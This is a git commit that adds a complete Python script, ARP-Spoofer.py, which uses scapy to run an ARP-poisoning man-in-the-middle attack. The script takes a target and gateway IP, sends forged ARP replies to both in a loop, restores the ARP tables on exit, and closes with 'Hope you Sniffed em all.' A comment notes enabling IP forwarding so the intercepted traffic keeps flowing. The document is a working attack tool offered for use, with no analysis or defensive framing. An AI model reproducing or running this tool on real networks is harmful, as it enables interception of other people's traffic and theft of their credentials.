e637e1e8abe0ca8fcb40b2461f3b1a2c0a0a2692
gobinathan-l <gobinathan.contact@gmail.com>
2020-04-13 14:45:06 +0530

    First Commit

---
+++ ARP-Spoofer.py
@@ -0,0 +1,57 @@
+#echo 1 > /proc/sys/net/ipv4/ip_forward
+
+import scapy.all as scapy
+import time
+import argparse
+import sys
+
+def get_arguements():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t","--target", dest="target_ip", help="Press -h to display Help.")
+    parser.add_argument("-g","--gateway", dest="spoof_ip", help="Press -h to display Help.")
+    options = parser.parse_args()
+    return options
+
+def get_mac(ip):
+    try:
+        arp_request = scapy.ARP(pdst=ip)
+        arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = arp_broadcast/arp_request
+        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # To get only the answered machines list.
+        return answered_list[0][1].hwsrc
+    except IndexError:
+        print("[-] No Arguements Specified. Press -h for help.")
+        sys.exit()
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # pdst stands for Packet Destination and vice versa.
+    scapy.send(packet, verbose=False)
+
+def restore(target_ip, source_ip): # The source IP is the Mac Address of the Router.
+    target_mac = get_mac(target_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc = source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+
+def launch_attack(target_ip, spoof_ip):
+    try:
+        counter = 0
+        while True:
+            spoof(target_ip , spoof_ip)
+            spoof(spoof_ip, target_ip)
+            print("\r[+] Sent " + str(counter) + " Packets", end="")
+            counter += 2
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[-] Ctrl+C detected, Quitting..")
+        restore(target_ip, spoof_ip)
+        restore(spoof_ip, target_ip)
+        print("[+] Restored the ARP tables of Target and Host.")
+        print("[*] Hope you Sniffed em all.")
+
+options = get_arguements()
+target_ip = options.target_ip
+spoof_ip  = options.spoof_ip
+launch_attack(target_ip, spoof_ip)
